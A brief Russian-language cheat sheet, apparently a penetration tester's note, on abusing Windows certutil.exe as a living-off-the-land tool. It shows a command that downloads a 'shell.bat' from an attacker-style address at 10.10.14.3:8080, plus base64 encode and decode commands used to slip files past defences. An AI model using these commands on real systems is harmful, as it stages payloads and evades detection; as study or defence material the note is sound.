#tools #AD #lolbin #windows 

> Certutil.exe - многозадачная утилита, изначально предназначенная для работы с сертификатами

## Оглавление
- [[#1) Передача файла]]
- [[#2) Кодирование файла]]
- [[#3) Расшифровка файла]]

---

## 1) Передача файла

```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

## 2) Кодирование файла

```cmd
certutil -encode file1 encodedfile
```

## 3) Расшифровка файла

```cmd
certutil -decode encodedfile file2
```